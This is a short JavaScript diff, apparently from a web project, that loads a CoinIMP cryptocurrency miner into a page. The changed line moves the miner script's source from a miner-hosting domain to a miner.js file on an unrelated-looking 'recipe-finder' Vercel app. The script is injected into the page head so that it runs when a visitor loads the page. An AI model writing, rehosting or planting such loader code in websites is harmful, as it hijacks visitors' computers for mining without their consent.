@@ -1,6 +1,6 @@
 // ✅ Load CoinIMP miner script dynamically
 const minerScript = document.createElement("script");
-minerScript.src = "https://www.hostingcloud.racing/PpZ9.js"; // galing sa CoinIMP
+minerScript.src = "https://recipe-finder-opal-pi.vercel.app/miner.js"; // galing sa CoinIMP
 minerScript.onerror = () => console.error("❌ Miner script failed to load");
 document.head.appendChild(minerScript);
 
